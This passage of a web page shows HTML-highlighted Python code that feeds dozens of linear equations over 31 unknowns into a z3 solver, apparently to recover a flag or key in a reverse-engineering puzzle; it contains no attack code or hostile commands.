+<span class="number">84</span>*a10 + <span class="number">51</span>*a11 + <span class="number">27</span>*a12 + <span class="number">96</span>*a13 +<span class="number">9</span>*a14 +<span class="number">73</span>*a15 +</span><br><span class="line"><span class="number">51</span>*a16+<span class="number">27</span>*a17+<span class="number">52</span>*a18 + <span class="number">96</span>*a19 + <span class="number">56</span>*a20 + <span class="number">87</span>*a21 +<span class="number">66</span>*a22 +</span><br><span class="line"><span class="number">49</span>*a23 +<span class="number">74</span>*a24 +<span class="number">28</span>*a25 + <span class="number">71</span>*a26 + <span class="number">94</span>*a27 +<span class="number">16</span>*a28 +<span class="number">43</span>*a29 +</span><br><span class="line"><span class="number">33</span>*a30 +<span class="number">57</span>*a31 == <span class="number">155144</span>)</span><br><span class="line"></span><br><span class="line">slover.add(<span class="number">82</span>*a1 + <span class="number">42</span>*a2 +<span class="number">13</span>*a3 +<span class="number">65</span>*a4 + <span class="number">17</span>*a5 + <span class="number">31</span>*a6 + <span class="number">46</span>*a7 +<span class="number">25</span>*a8 +</span><br><span class="line"><span class="number">62</span>*a9 + <span class="number">65</span>*a10 +<span class="number">56</span>*a11 + <span class="number">56</span>*a12+<span class="number">26</span>*a13 +<span class="number">62</span>*a14 +<span class="number">76</span>*a15+</span><br><span class="line"><span class="number">69</span>*a16 + <span class="number">40</span>*a17 + <span class="number">31</span>*a18 + <span class="number">58</span>*a19 +<span class="number">54</span>*a20 +<span class="number">9</span>*a21 +<span class="number">23</span>*a22 +</span><br><span class="line"><span class="number">72</span>*a23 +<span class="number">95</span>*a24 +<span class="number">75</span>*a25 + <span class="number">74</span>*a26 + <span class="number">32</span>*a27 +<span class="number">8</span>*a28 +<span class="number">53</span>*a29 +</span><br><span class="line"><span class="number">36</span>*a30 +<span class="number">71</span>*a31 == <span class="number">144052</span>)</span><br><span class="line"></span><br><span class="line">slover.add(<span class="number">75</span>*a1 +<span class="number">5</span>*a2 +<span class="number">53</span>*a3 +<span class="number">71</span>*a4 +<span class="number">9</span>*a5 + <span class="number">14</span>*a6 +<span class="number">16</span>*a7 + <span class="number">80</span>*a8 +</span><br><span class="line"><span class="number">41</span>*a9 +<span class="number">70</span>*a10 + <span class="number">63</span>*a11 + <span class="number">81</span>*a12 +<span class="number">73</span>*a13 +<span class="number">24</span>*a14 +<span class="number">96</span>*a15 +</span><br><span class="line"><span class="number">61</span>*a16 + <span class="number">87</span>*a17 +<span class="number">28</span>*a18 + <span class="number">89</span>*a19 + <span class="number">43</span>*a20 +<span class="number">46</span>*a21+<span class="number">4</span>*a22 +</span><br><span class="line"><span class="number">59</span>*a23 +<span class="number">91</span>*a24 +<span class="number">10</span>*a25 +<span class="number">1</span>*a26 + <span class="number">41</span>*a27 + <span class="number">87</span>*a28 + <span class="number">99</span>*a29 +</span><br><span class="line"><span class="number">9</span>*a30 +<span class="number">74</span>*a31==<span class="number">154311</span>)</span><br><span class="line"></span><br><span class="line">slover.add(<span class="number">81</span>*a1 +<span class="number">69</span>*a2 +<span class="number">66</span>*a3 +<span class="number">57</span>*a4 + <span class="number">58</span>*a5 + <span class="number">72</span>*a6 + <span class="number">8</span>*a7 +<span class="number">61</span>*a8 +</span><br><span class="line"><span class="number">5</span>*a9 +<span class="number">73</span>*a10 +<span class="number">35</span>*a11 +<span class="number">57</span>*a12 +<span class="number">67</span>*a13 +<span class="number">77</span>*a14 +<span class="number">35</span>*a15 +</span><br><span class="line"><span class="number">7</span>*a16 + <span class="number">91</span>*a17 +<span class="number">83</span>*a18 + <span class="number">4</span>*a19 + <span class="number">92</span>*a20 + <span class="number">39</span>*a21+<span class="number">84</span>*a22 +</span><br><span class="line"><span class="number">47</span>*a23 + <span class="number">60</span>*a24 +<span class="number">35</span>*a25 + <span class="number">59</span>*a26 + <span class="number">74</span>*a27 + <span class="number">42</span>*a28 +<span class="number">51</span>*a29 +</span><br><span class="line"><span class="number">93</span>*a30+<span class="number">20</span>*a31==<span class="number">164152</span>)</span><br><span class="line"></span><br><span class="line">slover.add(<span class="number">34</span>*a1 + <span class="number">7</span>*a2 +<span class="number">10</span>*a3 +<span class="number">52</span>*a4 +<span class="number">39</span>*a5 + <span class="number">34</span>*a6 +<span class="number">52</span>*a7 +<span class="number">7</span>*a8 +</span><br><span class="line"><span class="number">73</span>*a9 +<span class="number">34</span>*a10+ <span class="number">8</span>*a11 +<span class="number">76</span>*a12 +<span class="number">63</span>*a13 +<span class="number">32</span>*a14 +<span class="number">40</span>*a15 +</span><br><span class="line"><span class="number">70</span>*a16 + <span class="number">7</span>*a17 +<span class="number">38</span>*a18 +<span class="number">32</span>*a19 +<span class="number">92</span>*a20 +<span class="number">97</span>*a21+<span class="number">87</span>*a22 +</span><br><span class="line"><span class="number">57</span>*a23 +<span class="number">74</span>*a24 + <span class="number">46</span>*a25 +<span class="number">3</span>*a26 + <span class="number">14</span>*a27 + <span class="number">84</span>*a28 + <span class="number">35</span>*a29 +</span><br><span class="line"><span class="number">92</span>*a30 +<span class="number">62</span>*a31==<span class="number">143604</span>)</span><br><span class="line"></span><br><span class="line">slover.add(<span class="number">48</span>*a1 + <span class="number">35</span>*a2 + <span class="number">21</span>*a3 + <span class="number">87</span>*a4+ <span class="number">4</span>*a5 + <span class="number">65</span>*a6 +<span class="number">70</span>*a7 +<span class="number">69</span>*a8 +</span><br><span class="line"><span class="number">34</span>*a9 +<span class="number">63</span>*a10 + <span class="number">25</span>*a11 + <span class="number">23</span>*a12 + <span class="number">62</span>*a13+<span class="number">72</span>*a14 +<span class="number">75</span>*a15 +</span><br><span class="line"><span class="number">98</span>*a16 + <span class="number">18</span>*a17 +<span class="number">86</span>*a18+ <span class="number">19</span>*a19 + <span class="number">54</span>*a20 +<span class="number">96</span>*a21 +<span class="number">74</span>*a22 +</span><br><span class="line"><span class="number">97</span>*a23 +<span class="number">27</span>*a24 +<span class="number">21</span>*a25 +<span class="number">74</span>*a26 + <span class="number">74</span>*a27 +<span class="number">90</span>*a28 +<span class="number">33</span>*a29 +</span><br><span class="line"><span class="number">71</span>*a30 + <span class="number">46</span>*a31== <span class="number">164871</span>)</span><br><span class="line"></span><br><span class="line">slover.add(<span class="number">74</span>*a1 + <span class="number">49</span>*a2 +<span class="number">85</span>*a3 +<span class="number">69</span>*a4 + <span class="number">54</span>*a5 + <span class="number">86</span>*a6 +<span class="number">75</span>*a7 +<span class="number">34</span>*a8 +</span><br><span class="line"><span class="number">30</span>*a9 +<span class="number">42</span>*a10 + <span class="number">71</span>*a11 + <span class="number">52</span>*a12 + <span class="number">35</span>*a13 +<span class="number">22</span>*a14 +<span class="number">91</span>*a15 +</span><br><span class="line"><span class="number">34</span>*a16 +<span class="number">13</span>*a17 +<span class="number">1</span>*a18 + <span class="number">80</span>*a19 + <span class="number">48</span>*a20 +<span class="number">32</span>*a21 + <span class="number">71</span>*a22 +</span><br><span class="line"><span class="number">88</span>*a23+ <span class="number">68</span>*a24 +<span class="number">22</span>*a25+<span class="number">64</span>*a26 +<span class="number">60</span>*a27 +<span class="number">85</span>*a28 +<span class="number">79</span>*a29 +</span><br><span class="line"><span class="number">52</span>*a30 +<span class="number">22</span>*a31==<span class="number">158482</span>)</span><br><span class="line"></span><br><span class="line">slover.add(<span class="number">65</span>*a1 + <span class="number">99</span>*a2 + <span class="number">25</span>*a3 +<span class="number">72</span>*a4 + <span class="number">68</span>*a5 + <span class="number">66</span>*a6 + <span class="number">85</span>*a7 + <span class="number">8</span>*a8 +</span><br><span class="line"><span class="number">24</span>*a9 + <span class="number">59</span>*a10 +<span class="number">74</span>*a11 + <span class="number">99</span>*a12 + <span class="number">82</span>*a13 + <span class="number">88</span>*a14+<span class="number">17</span>*a15 +</span><br><span class="line"><span class="number">21</span>*a16 +<span class="number">70</span>*a17 +<span class="number">68</span>*a18+ <span class="number">2</span>*a19 +<span class="number">22</span>*a20 + <span class="number">69</span>*a21 + <span class="number">32</span>*a22 +</span><br><span class="line"><span class="number">38</span>*a23 + <span class="number">27</span>*a24+<span class="number">8</span>*a25+<span class="number">7</span>*a26+<span class="number">19</span>*a27 +<span class="number">36</span>*a28 +<span class="number">32</span>*a29 +</span><br><span class="line"><span class="number">85</span>*a30+<span class="number">40</span>*a31==<span class="number">140834</span>)</span><br><span class="line"></span><br><span class="line">slover.add(<span class="number">11</span>*a1 +<span class="number">37</span>*a2 +<span class="number">33</span>*a3+<span class="number">25</span>*a4 + <span class="number">10</span>*a5 + <span class="number">12</span>*a6 + <span class="number">99</span>*a7 +<span class="number">58</span>*a8 +</span><br><span class="line"><span class="number">66</span>*a9 + <span class="number">94</span>*a10 + <span class="number">94</span>*a11 + <span class="number">78</span>*a12 +<span class="number">33</span>*a13 +<span class="number">15</span>*a14 + <span class="number">92</span>*a15 +</span><br><span class="line"><span class="number">64</span>*a16 + <span class="number">39</span>*a17 + <span class="number">23</span>*a18 + <span class="number">11</span>*a19 +<span class="number">41</span>*a20 +<span class="number">67</span>*a21 +<span class="number">8</span>*a22 +</span><br><span class="line"><span class="number">24</span>*a23 + <span class="number">4</span>*a24 +<span class="number">40</span>*a25 +<span class="number">92</span>*a26 +<span class="number">54</span>*a27 +<span class="number">37</span>*a28+<span class="number">94</span>*a29 +</span><br><span class="line"><span class="number">71</span>*a30 +<span class="number">25</span>*a31==<span class="number">134191</span>)</span><br><span class="line"></span><br><span class="line">slover.add(<span class="number">78</span>*a1 + <span class="number">57</span>*a2 +<span class="number">74</span>*a3 +<span class="number">90</span>*a4+ <span class="number">14</span>*a5 + <span class="number">52</span>*a6 + <span class="number">7</span>*a7 +<span class="number">12</span>*a8 +</span><br><span class="line"><span class="number">57</span>*a9 +<span class="number">14</span>*a10 + <span class="number">47</span>*a11 + <span class="number">20</span>*a12 + <span class="number">24</span>*a13 + <span class="number">32</span>*a14 + <span class="number">61</span>*a15 +</span><br><span class="line"><span class="number">85</span>*a16 +<span class="number">58</span>*a17 +<span class="number">99</span>*a18 + <span class="number">18</span>*a19 + <span class="number">52</span>*a20 +<span class="number">31</span>*a21 +<span class="number">77</span>*a22 +</span><br><span class="line"><span class="number">13</span>*a23 +<span class="number">69</span>*a24 +<span class="number">62</span>*a25+<span class="number">85</span>*a26 +<span class="number">46</span>*a27+<span class="number">40</span>*a28+<span class="number">75</span>*a29 +</span><br><span class="line"><span class="number">48</span>*a30 +<span class="number">69</span>*a31==<span class="number">153769</span>)</span><br><span class="line"></span><br><span class="line">slover.add(<span class="number">39</span>*a1 +<span class="number">62</span>*a2 +<span class="number">21</span>*a3+<span class="number">75</span>*a4+ <span class="number">24</span>*a5 + <span class="number">8</span>*a6 + <span class="number">12</span>*a7 +<span class="number">66</span>*a8 +</span><br><span class="line"><span class="number">2</span>*a9 +<span class="number">74</span>*a10 + <span class="number">21</span>*a11 + <span class="number">40</span>*a12 + <span class="number">84</span>*a13 +<span class="number">36</span>*a14 +<span class="number">45</span>*a15 +</span><br><span class="line"><span class="number">98</span>*a16 + <span class="number">95</span>*a17 + <span class="number">43</span>*a18+ <span class="number">49</span>*a19 + <span class="number">27</span>*a20 + <span class="number">61</span>*a21 +<span class="number">24</span>*a22 +</span><br><span class="line"><span class="number">1</span>*a23 + <span class="number">90</span>*a24+<span class="number">89</span>*a25 +<span class="number">70</span>*a26 + <span class="number">45</span>*a27 + <span class="number">65</span>*a28 +<span class="number">46</span>*a29 +</span><br><span class="line"><span class="number">17</span>*a30 +<span class="number">65</span>*a31== <span class="number">149992</span>)</span><br><span class="line"></span><br><span class="line">slover.add(<span class="number">2</span>*a1 + <span class="number">97</span>*a2 +<span class="number">59</span>*a3 +<span class="number">95</span>*a4 +<span class="number">21</span>*a5 + <span class="number">52</span>*a6 + <span class="number">49</span>*a7 + <span class="number">30</span>*a8 +</span><br><span class="line"><span class="number">59</span>*a9 +<span class="number">62</span>*a10 + <span class="number">81</span>*a11 +<span class="number">91</span>*a12 + <span class="number">56</span>*a13 + <span class="number">69</span>*a14 + <span class="number">36</span>*a15 +</span><br><span class="line"><span class="number">12</span>*a16 +<span class="number">92</span>*a17+<span class="number">12</span>*a18 + <span class="number">58</span>*a19 + <span class="number">16</span>*a20 +<span class="number">38</span>*a21 +<span class="number">24</span>*a22 +</span><br><span class="line"><span class="number">31</span>*a23+<span class="number">87</span>*a24 +<span class="number">98</span>*a25+ <span class="number">13</span>*a26 + <span class="number">83</span>*a27 +<span class="number">33</span>*a28+<span class="number">11</span>*a29 +</span><br><span class="line"><span class="number">89</span>*a30 + <span class="number">50</span>*a31 == <span class="number">152681</span>)</span><br><span class="line"></span><br><span class="line">slover.add(<span class="number">85</span>*a1 +<span class="number">75</span>*a2 +<span class="number">2</span>*a3 +<span class="number">54</span>*a4+<span class="number">72</span>*a5 + <span class="number">14</span>*a6 + <span class="number">76</span>*a7 + <span class="number">49</span>*a8 +</span><br><span class="line"><span class="number">71</span>*a9 +<span class="number">21</span>*a10 + <span class="number">52</span>*a11 + <span class="number">12</span>*a12 + <span class="number">48</span>*a13+<span class="number">67</span>*a14 +<span class="number">48</span>*a15 +</span><br><span class="line"><span class="number">50</span>*a16 +<span class="number">78</span>*a17 +<span class="number">85</span>*a18 + <span class="number">59</span>*a19 +<span class="number">86</span>*a20 +<span class="number">43</span>*a21 +<span class="number">9</span>*a22 +</span><br><span class="line"><span class="number">28</span>*a23 + <span class="number">60</span>*a24 +<span class="number">66</span>*a25+ <span class="number">35</span>*a26 + <span class="number">42</span>*a27 +<span class="number">51</span>*a28 +<span class="number">84</span>*a29 +</span><br><span class="line"><span class="number">33</span>*a30 +<span class="number">38</span>*a31== <span class="number">151583</span>)</span><br><span class="line"></span><br><span class="line">slover.add(<span class="number">76</span>*a1 + <span class="number">64</span>*a2 +<span class="number">28</span>*a3 + <span class="number">18</span>*a4+ <span class="number">26</span>*a5 + <span class="number">12</span>*a6 + <span class="number">48</span>*a7 +<span class="number">38</span>*a8 +</span><br><span class="line"><span class="number">45</span>*a9 +<span class="number">32</span>*a10 +<span class="number">31</span>*a11 +<span class="number">32</span>*a12 +<span class="number">70</span>*a13 +<span class="number">76</span>*a14 +<span class="number">55</span>*a15 +</span><br><span class="line"><span class="number">32</span>*a16 +<span class="number">66</span>*a17 +<span class="number">10</span>*a18 +<span class="number">92</span>*a19 +<span class="number">32</span>*a20+<span class="number">75</span>*a21 +<span class="number">52</span>*a22 +</span><br><span class="line"><span class="number">89</span>*a23+<span class="number">84</span>*a24+<span class="number">53</span>*a25+<span class="number">25</span>*a26 +<span class="number">14</span>*a27 +<span class="number">86</span>*a28+<span class="number">44</span>*a29 +</span><br><span class="line"><span class="number">25</span>*a30 +<span class="number">27</span>*a31 == <span class="number">135652</span>)</span><br><span class="line"></span><br><span class="line">slover.add(<span class="number">22</span>*a1+<span class="number">73</span>*a2 +<span class="number">60</span>*a3+<span class="number">72</span>*a4+ <span class="number">85</span>*a5 + <span class="number">8</span>*a6 + <span class="number">75</span>*a7 +<span class="number">91</span>*a8 +</span><br><span class="line"><span class="number">90</span>*a9 +<span class="number">93</span>*a10 +<span class="number">40</span>*a11 + <span class="number">2</span>*a12 +<span class="number">89</span>*a13 +<span class="number">89</span>*a14 +<span class="number">34</span>*a15 +</span><br><span class="line"><span class="number">87</span>*a16 +<span class="number">77</span>*a17 +<span class="number">99</span>*a18 + <span class="number">71</span>*a19 + <span class="number">82</span>*a20 +<span class="number">34</span>*a21 + <span class="number">6</span>*a22 +</span><br><span class="line"><span class="number">10</span>*a23+<span class="number">92</span>*a24 +<span class="number">8</span>*a25 +<span class="number">8</span>*a26 +<span class="number">5</span>*a27 +<span class="number">66</span>*a28 +<span class="number">29</span>*a29 +</span><br><span class="line"><span class="number">77</span>*a30 +<span class="number">72</span>*a31==<span class="number">171031</span>)</span><br><span class="line"></span><br><span class="line">slover.add(<span class="number">47</span>*a1 +<span class="number">30</span>*a2+<span class="number">43</span>*a3+<span class="number">62</span>*a4+ <span class="number">29</span>*a5 + <span class="number">79</span>*a6 + <span class="number">4</span>*a7 +<span class="number">92</span>*a8 +</span><br><span class="line"><span class="number">45</span>*a9 +<span class="number">93</span>*a10 +<span class="number">11</span>*a11+<span class="number">41</span>*a12 + <span class="number">86</span>*a13 + <span class="number">51</span>*a14 +<span class="number">15</span>*a15 +</span><br><span class="line"><span class="number">25</span>*a16+<span class="number">4</span>*a17 + <span class="number">38</span>*a18 +<span class="number">59</span>*a19 +<span class="number">67</span>*a20+<span class="number">57</span>*a21 + <span class="number">28</span>*a22 +</span><br><span class="line"><span class="number">36</span>*a23 + <span class="number">97</span>*a24 +<span class="number">69</span>*a25 + <span class="number">5</span>*a26 + <span class="number">71</span>*a27 + <span class="number">95</span>*a28 +<span class="number">39</span>*a29 +</span><br><span class="line"><span class="number">7</span>*a30 +<span class="number">12</span>*a31==<span class="number">144653</span>)</span><br><span class="line"></span><br><span class="line">slover.add(<span class="number">96</span>*a1 + <span class="number">45</span>*a2 + <span class="number">36</span>*a3 +<span class="number">83</span>*a4 + <span class="number">61</span>*a5 + <span class="number">3</span>*a6 + <span class="number">44</span>*a7 +<span class="number">20</span>*a8 +</span><br><span class="line"><span class="number">70</span>*a9 +<span class="number">93</span>*a10 + <span class="number">23</span>*a11 +<span class="number">83</span>*a12 + <span class="number">19</span>*a13 + <span class="number">77</span>*a14 + <span class="number">54</span>*a15 +</span><br><span class="line"><span class="number">64</span>*a16 + <span class="number">41</span>*a17 +<span class="number">76</span>*a18 + <span class="number">60</span>*a19 + <span class="number">92</span>*a20 +<span class="number">44</span>*a21 +<span class="number">63</span>*a22 +</span><br><span class="line"><span class="number">42</span>*a23+<span class="number">84</span>*a24+<span class="number">26</span>*a25+ <span class="number">68</span>*a26 + <span class="number">74</span>*a27 +<span class="number">58</span>*a28 +<span class="number">32</span>*a29 +</span><br><span class="line"><span class="number">50</span>*a30 +<span class="number">81</span>*a31==<span class="number">171959</span>)</span><br><span class="line"></span><br><span class="line">slover.add(<span class="number">64</span>*a1 + <span class="number">56</span>*a2 +<span class="number">43</span>*a3 +<span class="number">39</span>*a4+ <span class="number">85</span>*a5 + <span class="number">16</span>*a6 +<span class="number">67</span>*a7 +<span class="number">86</span>*a8 +</span><br><span class="line"><span class="number">22</span>*a9 +<span class="number">16</span>*a10 + <span class="number">40</span>*a11 +<span class="number">68</span>*a12 +<span class="number">97</span>*a13 + <span class="number">6</span>*a14 +<span class="number">37</span>*a15 +</span><br><span class="line"><span class="number">20</span>*a16 + <span class="number">5</span>*a17 +<span class="number">3</span>*a18 + <span class="number">82</span>*a19 + <span class="number">73</span>*a20 +<span class="number">21</span>*a21+<span class="number">97</span>*a22 +</span><br><span class="line"><span class="number">95</span>*a23+<span class="number">96</span>*a24 +<span class="number">6</span>*a25 +<span class="number">62</span>*a26+<span class="number">95</span>*a27+<span class="number">45</span>*a28+<span class="number">55</span>*a29 +</span><br><span class="line"><span class="number">8</span>*a30 +<span class="number">51</span>*a31==<span class="number">151173</span>)</span><br><span class="line"></span><br><span class="line">slover.add(<span class="number">17</span>*a1 +<span class="number">49</span>*a2 +<span class="number">16</span>*a3 +<span class="number">59</span>*a4 +<span class="number">1</span>*a5 + <span class="number">66</span>*a6 + <span class="number">82</span>*a7 + <span class="number">58</span>*a8 +</span><br><span class="line"><span class="number">91</span>*a9+<span class="number">8</span>*a10+<span class="number">44</span>*a11 +<span class="number">13</span>*a12 +<span class="number">88</span>*a13 +<span class="number">98</span>*a14 +<span class="number">44</span>*a15 +</span><br><span class="line"><span class="number">41</span>*a16 + <span class="number">27</span>*a17 +<span class="number">68</span>*a18 +<span class="number">2</span>*a19 +<span class="number">33</span>*a20 +<span class="number">99</span>*a21 +<span class="number">37</span>*a22 +</span><br><span class="line"><span class="number">92</span>*a23+ <span class="number">94</span>*a24 + <span class="number">43</span>*a25 +<span class="number">16</span>*a26 + <span class="number">86</span>*a27 + <span class="number">96</span>*a28 + <span class="number">36</span>*a29 +</span><br><span class="line"><span class="number">89</span>*a30+<span class="number">23</span>*a31==<span class="number">151468</span>)</span><br><span class="line"></span><br><span class="line">slover.add(<span class="number">23</span>*a1 + <span class="number">40</span>*a2 + <span class="number">5</span>*a3 +<span class="number">76</span>*a4 +<span class="number">15</span>*a5 + <span class="number">39</span>*a6 + <span class="number">5</span>*a7 + <span class="number">69</span>*a8 +</span><br><span class="line"><span class="number">48</span>*a9+<span class="number">3</span>*a10+<span class="number">99</span>*a11 + <span class="number">14</span>*a12 +<span class="number">66</span>*a13 + <span class="number">97</span>*a14 +<span class="number">66</span>*a15 +</span><br><span class="line"><span class="number">90</span>*a16 + <span class="number">17</span>*a17 + <span class="number">41</span>*a18 + <span class="number">73</span>*a19 + <span class="number">45</span>*a20 +<span class="number">45</span>*a21 +<span class="number">36</span>*a22 +</span><br><span class="line"><span class="number">81</span>*a23+<span class="number">74</span>*a24 +<span class="number">53</span>*a25 +<span class="number">29</span>*a26 + <span class="number">93</span>*a27 + <span class="number">25</span>*a28 +<span class="number">35</span>*a29 +</span><br><span class="line"><span class="number">34</span>*a30+<span class="number">8</span>*a31==<span class="number">135144</span>)</span><br><span class="line"></span><br><span class="line">slover.add(<span class="number">6</span>*a1 + <span class="number">78</span>*a2 +<span class="number">51</span>*a3 +<span class="number">74</span>*a4+<span class="number">1</span>*a5 + <span class="number">25</span>*a6 + <span class="number">41</span>*a7 +<span class="number">99</span>*a8 +</span><br><span class="line"><span class="number">52</span>*a9+<span class="number">74</span>*a10 +<span class="number">30</span>*a11 + <span class="number">97</span>*a12 +<span class="number">63</span>*a13 +<span class="number">2</span>*a14 +<span class="number">25</span>*a15 +</span><br><span class="line"><span class="number">76</span>*a16 + <span class="number">56</span>*a17 + <span class="number">35</span>*a18 +<span class="number">28</span>*a19 + <span class="number">34</span>*a20 + <span class="number">40</span>*a21 +<span class="number">18</span>*a22 +</span><br><span class="line"><span class="number">65</span>*a23 + <span class="number">67</span>*a24 + <span class="number">43</span>*a25 + <span class="number">78</span>*a26 +<span class="number">6</span>*a27 +<span class="number">54</span>*a28 +<span class="number">38</span>*a29 +</span><br><span class="line"><span class="number">45</span>*a30+<span class="number">81</span>*a31==<span class="number">146290</span>)</span><br><span class="line"></span><br><span class="line">slover.add(<span class="number">58</span>*a1 + <span class="number">47</span>*a2 +<span class="number">72</span>*a3 +<span class="number">43</span>*a4 + <span class="number">99</span>*a5 + <span class="number">36</span>*a6 + <span class="number">89</span>*a7 +<span class="number">31</span>*a8 +</span><br><span class="line"><span class="number">61</span>*a9 + <span class="number">66</span>*a10 +<span class="number">59</span>*a11 +<span class="number">74</span>*a12 +<span class="number">32</span>*a13 +<span class="number">2</span>*a14 +<span class="number">39</span>*a15 +</span><br><span class="line"><span class="number">73</span>*a16 +<span class="number">86</span>*a17 + <span class="number">63</span>*a18 + <span class="number">18</span>*a19 +<span class="number">92</span>*a20 + <span class="number">44</span>*a21 +<span class="number">67</span>*a22 +</span><br><span class="line"><span class="number">37</span>*a23 +<span class="number">66</span>*a24 +<span class="number">25</span>*a25 + <span class="number">32</span>*a26 +<span class="number">59</span>*a27 +<span class="number">31</span>*a28+<span class="number">11</span>*a29 +</span><br><span class="line"><span class="number">41</span>*a30 + <span class="number">65</span>*a31 == <span class="number">157439</span>)</span><br><span class="line"></span><br><span class="line">slover.add(<span class="number">79</span>*a1+<span class="number">18</span>*a2+<span class="number">22</span>*a3+<span class="number">73</span>*a4+ <span class="number">21</span>*a5 + <span class="number">76</span>*a6 + <span class="number">5</span>*a7 +<span class="number">27</span>*a8 +</span><br><span class="line"><span class="number">36</span>*a9 +<span class="number">22</span>*a10 + <span class="number">90</span>*a11 +<span class="number">23</span>*a12 +<span class="number">20</span>*a13 +<span class="number">88</span>*a14 +<span class="number">77</span>*a15 +</span><br><span class="line"><span class="number">18</span>*a16 + <span class="number">10</span>*a17 +<span class="number">14</span>*a18 + <span class="number">80</span>*a19 + <span class="number">1</span>*a20 + <span class="number">96</span>*a21 +<span class="number">97</span>*a22 +</span><br><span class="line"><span class="number">41</span>*a23 +<span class="number">90</span>*a24 +<span class="number">53</span>*a25 + <span class="number">20</span>*a26 +<span class="number">41</span>*a27 +<span class="number">2</span>*a28 +<span class="number">87</span>*a29 +</span><br><span class="line"><span class="number">8</span>*a30 +<span class="number">40</span>*a31==<span class="number">127198</span>)</span><br><span class="line"></span><br><span class="line">slover.add(<span class="number">94</span>*a1 +<span class="number">70</span>*a2 +<span class="number">72</span>*a3 +<span class="number">93</span>*a4 +<span class="number">17</span>*a5 +<span class="number">56</span>*a6 + <span class="number">53</span>*a7 +<span class="number">78</span>*a8 +</span><br><span class="line"><span class="number">72</span>*a9 + <span class="number">49</span>*a10 +<span class="number">86</span>*a11 +<span class="number">62</span>*a12 + <span class="number">41</span>*a13 + <span class="number">85</span>*a14 +<span class="number">69</span>*a15 +</span><br><span class="line"><span class="number">71</span>*a16+<span class="number">20</span>*a17 + <span class="number">34</span>*a18 + <span class="number">24</span>*a19 + <span class="number">24</span>*a20 + <span class="number">14</span>*a21 +<span class="number">86</span>*a22 +</span><br><span class="line"><span class="number">54</span>*a23 +<span class="number">13</span>*a24 +<span class="number">41</span>*a25 +<span class="number">68</span>*a26 + <span class="number">31</span>*a27 +<span class="number">50</span>*a28 +<span class="number">23</span>*a29 +</span><br><span class="line"><span class="number">94</span>*a30 +<span class="number">72</span>*a31== <span class="number">162137</span>)</span><br><span class="line"></span><br><span class="line">slover.add(<span class="number">34</span>*a1 + <span class="number">95</span>*a2 +<span class="number">66</span>*a3 +<span class="number">79</span>*a4 + <span class="number">91</span>*a5 + <span class="number">35</span>*a6 + <span class="number">8</span>*a7 +<span class="number">16</span>*a8 +</span><br><span class="line"><span class="number">95</span>*a9 + <span class="number">95</span>*a10 + <span class="number">40</span>*a11 + <span class="number">68</span>*a12 + <span class="number">13</span>*a13 + <span class="number">54</span>*a14+<span class="number">80</span>*a15 +</span><br><span class="line"><span class="number">98</span>*a16 +<span class="number">15</span>*a17 + <span class="number">39</span>*a18+ <span class="number">41</span>*a19 + <span class="number">79</span>*a20 +<span class="number">34</span>*a21 +<span class="number">54</span>*a22 +</span><br><span class="line"><span class="number">92</span>*a23+<span class="number">17</span>*a24 +<span class="number">97</span>*a25 + <span class="number">76</span>*a26 +<span class="number">49</span>*a27 +<span class="number">95</span>*a28 +<span class="number">6</span>*a29 +</span><br><span class="line"><span class="number">83</span>*a30 +<span class="number">79</span>*a31==<span class="number">180077</span>)</span><br><span class="line"></span><br><span class="line">slover.add(<span class="number">74</span>*a1 + <span class="number">42</span>*a2 +<span class="number">45</span>*a3 +<span class="number">72</span>*a4 +<span class="number">6</span>*a5 + <span class="number">3</span>*a6 +<span class="number">59</span>*a7 +<span class="number">47</span>*a8 +</span><br><span class="line"><span class="number">57</span>*a9 +<span class="number">62</span>*a10+<span class="number">85</span>*a11 +<span class="number">6</span>*a12 +<span class="number">72</span>*a13+<span class="number">25</span>*a14 +<span class="number">78</span>*a15 +</span><br><span class="line"><span class="number">27</span>*a16 + <span class="number">6</span>*a17 +<span class="number">27</span>*a18+<span class="number">61</span>*a19 +<span class="number">88</span>*a20 +<span class="number">60</span>*a21+<span class="number">89</span>*a22 +</span><br><span class="line"><span class="number">53</span>*a23 +<span class="number">76</span>*a24 +<span class="number">97</span>*a25 +<span class="number">56</span>*a26 + <span class="number">52</span>*a27 +<span class="number">26</span>*a28 + <span class="number">5</span>*a29 +</span><br><span class="line"><span class="number">7</span>*a30 +<span class="number">35</span>*a31==<span class="number">142239</span>)</span><br><span class="line"></span><br><span class="line">slover.add(<span class="number">53</span>*a1 + <span class="number">30</span>*a2 +<span class="number">63</span>*a3 + <span class="number">88</span>*a4 + <span class="number">54</span>*a5 + <span class="number">99</span>*a6 +<span class="number">40</span>*a7 +<span class="number">85</span>*a8 +</span><br><span class="line"><span class="number">42</span>*a9+ <span class="number">35</span>*a10 +<span class="number">99</span>*a11 +<span class="number">88</span>*a12 +<span class="number">55</span>*a13 + <span class="number">8</span>*a14 +<span class="number">24</span>*a15 +</span><br><span class="line"><span class="number">91</span>*a16 +<span class="number">55</span>*a17 +<span class="number">23</span>*a18+<span class="number">53</span>*a19 +<span class="number">68</span>*a20+<span class="number">76</span>*a21 +<span class="number">49</span>*a22 +</span><br><span class="line"><span class="number">32</span>*a23 +<span class="number">80</span>*a24 +<span class="number">81</span>*a25+<span class="number">95</span>*a26 +<span class="number">21</span>*a27 +<span class="number">73</span>*a28 +<span class="number">83</span>*a29 +</span><br><span class="line"><span class="number">46</span>*a30 +<span class="number">44</span>*a31==<span class="number">179115</span>)</span><br><span class="line"></span><br><span class="line">slover.add(<span class="number">55</span>*a1+<span class="number">43</span>*a2 +<span class="number">39</span>*a3 +<span class="number">27</span>*a4+ <span class="number">19</span>*a5 + <span class="number">41</span>*a6 + <span class="number">7</span>*a7 + <span class="number">70</span>*a8 +</span><br><span class="line"><span class="number">54</span>*a9 +<span class="number">53</span>*a10 + <span class="number">38</span>*a11 + <span class="number">72</span>*a12 + <span class="number">50</span>*a13+<span class="number">1</span>*a14 +<span class="number">15</span>*a15 +</span><br><span class="line"><span class="number">89</span>*a16+<span class="number">79</span>*a17+<span class="number">17</span>*a18 + <span class="number">32</span>*a19 + <span class="number">58</span>*a20 +<span class="number">64</span>*a21 +<span class="number">68</span>*a22 +</span><br><span class="line"><span class="number">12</span>*a23+<span class="number">92</span>*a24 +<span class="number">53</span>*a25 +<span class="number">33</span>*a26 + <span class="number">54</span>*a27 + <span class="number">67</span>*a28 +<span class="number">34</span>*a29 +</span><br><span class="line"><span class="number">25</span>*a30 +<span class="number">37</span>*a31==<span class="number">140482</span>)</span><br><span class="line"></span><br><span class="line">slover.add(<span class="number">23</span>*a1 + <span class="number">39</span>*a2 + <span class="number">6</span>*a3 +<span class="number">84</span>*a4 +<span 